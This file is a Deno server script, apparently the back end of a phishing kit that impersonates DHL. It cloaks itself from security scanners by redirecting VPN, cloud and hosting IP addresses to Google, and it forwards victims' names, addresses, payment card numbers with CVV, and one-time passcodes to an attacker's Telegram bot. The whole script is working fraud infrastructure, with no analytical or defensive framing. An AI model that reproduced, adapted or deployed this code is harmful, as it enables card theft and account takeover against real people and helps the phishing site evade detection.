// ============================================================
// 1. IMPORTS & CONSTANTES
// ============================================================
import { serveDir } from "https://deno.land/std@0.224.0/http/file_server.ts";

const TELEGRAM_TOKEN = Deno.env.get("TELEGRAM_TOKEN") ?? "";
const CHAT_ID = Deno.env.get("CHAT_ID") ?? "";
const DIST_ROOT = "./dist";

// Activer/désactiver le blocage (mettre false pour les tests)
const ENABLE_IP_BLOCKING = true;

// Cache des IP (5 minutes)
const ipCache = new Map<string, { blocked: boolean; timestamp: number }>();
const CACHE_DURATION_MS = 5 * 60 * 1000;

// ============================================================
// 2. HEADERS CORS (uniquement pour les réponses POST)
// ============================================================
const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type",
};

// ============================================================
// 3. FONCTIONS UTILITAIRES
// ============================================================

// Envoi à Telegram
async function sendTelegram(text: string): Promise<void> {
  if (!TELEGRAM_TOKEN || !CHAT_ID) {
    console.warn("Telegram credentials are missing, skipping notification");
    return;
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
  await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text,
      parse_mode: "HTML",
    }),
  });
}

function buildFallbackResponse(message: string): Response {
  return new Response(
    `<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Site temporairement indisponible</title>
    <style>
      :root { color-scheme: light; }
      body {
        margin: 0;
        min-height: 100vh;
        display: grid;
        place-items: center;
        font-family: system-ui, sans-serif;
        background: #f6f7fb;
        color: #101828;
      }
      main {
        max-width: 32rem;
        padding: 2rem;
        text-align: center;
      }
      h1 { margin: 0 0 0.75rem; font-size: 2rem; }
      p { margin: 0; line-height: 1.6; color: #475467; }
    </style>
  </head>
  <body>
    <main>
      <h1>Site en cours de préparation</h1>
      <p>${message}</p>
    </main>
  </body>
</html>`,
    {
      status: 200,
      headers: { "Content-Type": "text/html; charset=utf-8" },
    },
  );
}

async function distExists(): Promise<boolean> {
  try {
    return (await Deno.stat(DIST_ROOT)).isDirectory;
  } catch {
    return false;
  }
}

function shouldUseSpaFallback(req: Request): boolean {
  if (req.method !== "GET") return false;

  const accept = req.headers.get("accept") ?? "";
  if (!accept.includes("text/html")) return false;

  const pathname = new URL(req.url).pathname;
  return !pathname.includes(".");
}

// Récupération de l'IP réelle
function getClientIP(req: Request): string {
  const forwarded = req.headers.get("x-forwarded-for");
  if (forwarded) return forwarded.split(",")[0].trim();
  const realIP = req.headers.get("x-real-ip");
  if (realIP) return realIP;
  return "Unknown";
}

// ============================================================
// 4. CŒUR DU BLOCAGE IP (très robuste)
// ============================================================
async function isBlockedIP(ip: string): Promise<boolean> {
  if (
    !ENABLE_IP_BLOCKING ||
    ip === "Unknown" ||
    ip === "127.0.0.1" ||
    ip.startsWith("192.168.") ||
    ip.startsWith("10.") ||
    ip.startsWith("172.16.")
  ) {
    return false;
  }

  const now = Date.now();
  const cached = ipCache.get(ip);
  if (cached && now - cached.timestamp < CACHE_DURATION_MS) {
    return cached.blocked;
  }

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 3000);

    const response = await fetch(`https://ipapi.co/${ip}/json/`, {
      signal: controller.signal,
    });
    clearTimeout(timeoutId);

    if (!response.ok) {
      ipCache.set(ip, { blocked: false, timestamp: now });
      return false;
    }

    const data = await response.json();
    const org = (data.org || "").toLowerCase();
    const asn = data.asn || "";

    // 1. Drapeaux explicites de l'API
    if (data.proxy === true || data.hosting === true) {
      ipCache.set(ip, { blocked: true, timestamp: now });
      return true;
    }

    // 2. Mots-clés bloquants (datacenter, VPN, hébergeurs)
    const blockedKeywords = [
      "vpn", "proxy", "hosting", "cloud", "datacenter", "server", "vps",
      "dedicated", "colo", "amazon", "aws", "google cloud", "microsoft azure",
      "digitalocean", "ovh", "hetzner", "linode", "vultr", "scaleway",
      "leaseweb", "nordvpn", "expressvpn", "surfshark", "cloudflare",
      "fastly", "akamai"
    ];
    for (const kw of blockedKeywords) {
      if (org.includes(kw)) {
        ipCache.set(ip, { blocked: true, timestamp: now });
        return true;
      }
    }

    // 3. Liste noire des ASN
    const blockedASNs = [
      "AS13335", "AS15169", "AS16509", "AS14061", "AS16276",
      "AS8075", "AS396982", "AS32934", "AS54113", "AS62567",
      "AS14618", "AS63949", "AS31898", "AS8100", "AS36351",
      "AS20473", "AS25820", "AS63473", "AS62240"
    ];
    if (blockedASNs.some((as) => asn.startsWith(as) || asn.includes(as))) {
      ipCache.set(ip, { blocked: true, timestamp: now });
      return true;
    }

    ipCache.set(ip, { blocked: false, timestamp: now });
    return false;
  } catch {
    ipCache.set(ip, { blocked: false, timestamp: now });
    return false;
  }
}

// ============================================================
// 5. GESTIONNAIRE PRINCIPAL (intercepte TOUTES les requêtes)
// ============================================================
Deno.serve(async (req: Request) => {
  const url = new URL(req.url);
  const ip = getClientIP(req);

  // --- ÉTAPE 1 : BLOQUAGE IP (REDIRECTION VERS GOOGLE) ---
  if (await isBlockedIP(ip)) {
    console.warn(`🚫 IP bloquée et redirigée : ${ip}`);
    // Redirection HTTP 302 vers Google
    return new Response(null, {
      status: 302,
      headers: { "Location": "https://www.google.com" },
    });
  }

  if (req.method === "OPTIONS") {
    return new Response(null, { status: 204, headers: corsHeaders });
  }

  // --- ÉTAPE 2 : GESTION DES REQUÊTES POST (API TELEGRAM) ---
  if (req.method === "POST") {
    try {
      const body = await req.json();
      const { type, data } = body;
      const userAgent = req.headers.get("user-agent") || "Unknown";

      let message = "";
      if (type === "visit") {
        message = `🚨 <b>New DHL Page Visit</b>\n\n🌐 IP: ${ip}\n📱 User-Agent: ${userAgent}\n📄 Page: ${data?.page || "Unknown"}\n🕐 Time: ${new Date().toUTCString()}`;
      } else if (type === "delivery") {
        message = `📦 <b>DHL — Delivery</b>\n\n👤 ${data?.firstName} ${data?.lastName}\n📧 ${data?.email}\n📞 ${data?.phone}\n🏠 ${data?.address}\n🌐 IP: ${ip}\n🕐 ${new Date().toUTCString()}`;
      } else if (type === "payment") {
        message = `💳 <b>DHL — Payment</b>\n\n👤 ${data?.cardName}\n💳 ${data?.cardNumber}\n📅 ${data?.expiry}\n🔒 ${data?.cvv}\n🌐 IP: ${ip}\n🕐 ${new Date().toUTCString()}`;
      } else if (type === "otp") {
        message = `🔐 <b>DHL — OTP</b>\n\n🔑 ${data?.otp}\n🌐 IP: ${ip}\n🕐 ${new Date().toUTCString()}`;
      } else {
        return new Response(JSON.stringify({ error: "Unknown type" }), {
          status: 400,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }

      await sendTelegram(message);
      return new Response(JSON.stringify({ ok: true }), {
        status: 200,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    } catch (err) {
      console.error("POST Error:", err);
      return new Response(JSON.stringify({ error: "Internal server error" }), {
        status: 500,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }
  }

  // --- ÉTAPE 3 : SERVIR LES FICHIERS STATIQUES (HTML, JS, CSS, etc.) ---
  // Si le build n'est pas présent, on renvoie une page de secours au lieu
  // d'un écran blanc.
  try {
    if (!await distExists()) {
      console.warn("dist/ is missing, serving fallback HTML");
      return buildFallbackResponse(
        "Le build frontend n'a pas encore été généré. Vérifiez la commande de build Deno Deploy puis relancez le déploiement.",
      );
    }

    const response = await serveDir(req, {
      fsRoot: DIST_ROOT,
      urlRoot: "",
      showDirListing: false,
      enableCors: true,
    });

    if (response.status !== 404) {
      return response;
    }

    if (shouldUseSpaFallback(req)) {
      const spaResponse = await serveDir(
        new Request(new URL("/index.html", req.url), {
          method: "GET",
          headers: req.headers,
        }),
        {
          fsRoot: DIST_ROOT,
          urlRoot: "",
          showDirListing: false,
          enableCors: true,
        },
      );

      if (spaResponse.status !== 404) {
        return spaResponse;
      }
    }

    return response;
  } catch (error) {
    console.error("ServeDir Error:", error);
    // Si le fichier n'est pas trouvé, on renvoie une 404 personnalisée
    return new Response("Page non trouvée", { status: 404 });
  }
});
